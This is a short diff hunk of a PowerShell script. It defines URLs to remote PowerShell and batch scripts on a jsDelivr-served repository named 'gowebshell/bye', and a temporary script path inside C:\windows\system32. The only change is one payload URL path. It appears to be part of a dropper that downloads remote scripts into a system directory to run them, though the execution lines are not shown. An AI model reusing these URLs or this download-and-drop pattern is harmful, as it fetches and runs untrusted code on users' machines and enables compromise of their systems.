@@ -1,5 +1,5 @@
 $powershellScriptURL1 = "https://cdn.jsdelivr.net/gh/gowebshell/bye/th/2.txt"
-$powershellScriptURL2 = "https://cdn.jsdelivr.net/gh/gowebshell/bye/th7/dowali.txt"
+$powershellScriptURL2 = "https://cdn.jsdelivr.net/gh/gowebshell/bye/th/dowali.txt"
 $batchScriptURL = "https://cdn.jsdelivr.net/gh/gowebshell/bye/th/1.txt"
 
 $tempScriptPath1 = "C:\windows\system32\script1.ps1"
